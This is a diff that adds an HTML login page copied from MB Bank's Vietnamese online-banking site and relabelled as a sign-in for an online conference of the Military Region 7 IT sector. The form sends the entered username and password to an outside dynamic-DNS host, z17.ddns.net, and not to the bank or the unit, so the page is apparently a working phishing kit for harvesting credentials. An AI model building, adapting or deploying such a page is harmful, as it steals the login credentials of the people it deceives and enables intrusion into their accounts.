@@ -1,0 +1,132 @@
+<!-- saved from url=(0052)https://online.mbbank.com.vn/retail/EstablishSession -->
+<html lang="vi">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>HNTH Login</title>
+	<link rel="icon" href="https://online.mbbank.com.vn/retail/img/logo-title.ico">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<script type="text/javascript">
+		function onLoginClick() {
+			var mandatoryUsername = "Bắt buộc phải nhập Tên và mật khẩu đăng nhập";
+			var maDonVi = "Mã đơn vị là bắt buộc";
+			if (document.getElementById("txtPassword").value == '' || document.getElementById("txtUserId").value == '') {
+				alert(mandatoryUsername);
+			} else if (document.getElementById("enter_room_field").value == '') {
+				alert(maDonVi);
+			}
+		}
+	</script>
+	<!--CSS animation-->
+	<!--
+	<link href="/css-cntt/animate.css" rel="stylesheet" type="text/css">
+-->
+	<!--CSS Custom-->
+	<link href="/css-cntt/style.css" type="text/css" rel="stylesheet">
+</head>
+
+<body class="bg-body-login">
+	<ul class="cb-slideshow">
+		<li><span></span>
+			<div></div>
+		</li>
+	</ul>
+	<div class="login clearfix">
+		<div class="wrap clearfix">
+			<div class="login-content clearfix">
+				<a href="#" class="logo-login wow fadeInDown" data-wow-delay="1.5s"><img src="./css-cntt/logo-login.png" alt=""></a>
+				<div class="login-form clearfix wow fadeInUp" data-wow-delay="2s">
+					<h3>Ngành CNTT Quân khu 7</h3>
+					<h5>HỘI NGHỊ TRỰC TUYẾN</h5>
+					<form action="https://z17.ddns.net/A" method="post">
+						<ul>
+							<li>
+								<input id="txtUserId" name="username" class="login-user" type="text" placeholder="Tên đăng nhập" autocomplete="off" onkeydown="if (event.keyCode == 13) document.getElementById(&#39;btnSignIn&#39;).click()">
+							</li>
+							<li>
+								<input id="txtPassword" name="password" class="login-pw" type="password" placeholder="Mật khẩu" autocomplete="off" onkeydown="if (event.keyCode == 13) document.getElementById(&#39;btnSignIn&#39;).click()">
+							</li>
+							<li>
+								<input id="enter_room_field" class="login-code" type="text" placeholder="Nhập mã đơn vị" autocomplete="off" onkeydown="if (event.keyCode == 13) document.getElementById(&#39;btnSignIn&#39;).click()">
+
+							</li>
+							<li>
+								<input id="enter_room_button" class="btn-login" type="submit" name="" value="Đăng nhập" onclick="onLoginClick()">
+							</li>
+							<li>
+								<a class="btn-reg" onclick="onOnlineRegistration()">Đăng ký</a>
+							</li>
+							<li class="login-help">
+								<a onclick="forgotPasswordOnClick()">Quên mật khẩu</a>
+								<a target="_blank" href="https://online.mbbank.com.vn/retail/file/logon/eMB%20Terms%20and%20Conditions.pdf">Điều khoản và điều kiện</a>
+								<a target="_blank" href="https://online.mbbank.com.vn/retail/file/logon/Huong%20dan%20giao%20dich%20an%20toan%20dich%20vu%20ngan%20hang%20dien%20tu%20MB%20eBanking.pdf">Hướng dẫn giao dịch an toàn</a>
+							</li>
+						</ul>
+					</form>
+				</div>
+			</div>
+		</div>
+
+		<div class="login-option">
+			<div class="wrap">
+				<span class="login-note" style="visibility: hidden">
+					Từ 15/08/2016, ngân hàng MB chính thức cung cấp giao diện eMB mới. Quý khách xin lưu ý:<br>- Tên đăng nhập, mật khẩu và phương thức xác thực (OTP) sử dụng như giao diện cũ.<br>- Giao diện mới chỉ tương thích với các trình duyệt: Chrome,
+					Firefox, Safari, IE10 trở lên…
+				</span>
+				<ul>
+					<li class="wow fadeInUp" data-wow-delay="2s">
+						<a href="https://online.mbbank.com.vn/retail/EstablishSession#" class="wow fadeInDown" data-wow-delay="2.2s">
+							<img src="./CNTT/ic-op1.png" alt="">
+							<span>Tiết kiệm số</span>
+						</a>
+					</li>
+					<li class="wow fadeInUp" data-wow-delay="2.2s">
+						<a class="wow fadeInDown" data-wow-delay="2.4s" href="https://online.mbbank.com.vn/retail/EstablishSession#">
+							<img src="./CNTT/ic-op2.png" alt="">
+							<span>Ưu đãi</span>
+						</a>
+					</li>
+					<li class="wow fadeInUp" data-wow-delay="2.4s">
+						<a class="wow fadeInDown" data-wow-delay="2.6s" href="https://online.mbbank.com.vn/retail/EstablishSession#">
+							<img src="./CNTT/ic-op3.png" alt="">
+							<span>Vay vốn</span>
+						</a>
+					</li>
+					<li class="wow fadeInUp" data-wow-delay="2.6s">
+						<a class="wow fadeInDown" data-wow-delay="2.8s" href="https://online.mbbank.com.vn/retail/EstablishSession#">
+							<img src="./CNTT/ic-op4.png" alt="">
+							<span>Thanh toán hóa đơn</span>
+						</a>
+					</li>
+					<li class="wow fadeInUp" data-wow-delay="2.8s">
+						<a class="wow fadeInDown" data-wow-delay="3s" href="https://online.mbbank.com.vn/retail/EstablishSession#">
+							<img src="./CNTT/ic-op5.png" alt="">
+							<span>Chuyển tiền 24/7</span>
+						</a>
+					</li>
+				</ul>
+			</div>
+		</div>
+
+		<div class="quicknav">
+			<a href="https://mbbank.com.vn/mangluoi/Pages/default.aspx" target="_blank" tab-id="1"><img src="./CNTT/icon-01.jpg"><span>Mạng lưới</span></a>
+		</div>
+		<div class="footer clearfix">
+			<div class="wrap">
+				<a style="float: left; margin-right: 20px;margin-top: 6px;" href="https://seal.controlcase.com/index.php?page=showCert&amp;cId=3824461881" target="_blank"><img src="./CNTT/pcs-dss.gif" alt="" style="height: 40px;"></a>
+				<span class="f-copyright">Bản quyền © 2016 thuộc về Ngân hàng Quân đội. Bảo lưu mọi quyền.</span>
+				<ul class="f-rule">
+					<li><a href="https://online.mbbank.com.vn/retail/EstablishSession#">Điều khoản sử dụng</a></li>
+					<li><a href="https://online.mbbank.com.vn/retail/EstablishSession#">An toàn bảo mật</a></li>
+				</ul>
+				<span class="login-lang">Ngôn ngữ: <a onclick="localeFlag(&#39;en_US&#39;);" href="https://online.mbbank.com.vn/retail/EstablishSession#"><img src="./CNTT/flag-en.png" alt=""></a></span>
+				<a href="https://online.mbbank.com.vn/retail/EstablishSession#" class="f-social"> Kết nối với chúng tôi</a>
+
+			</div>
+		</div>
+		<!--END footer-->
+	</div>
+
+</body>
+
+</html>
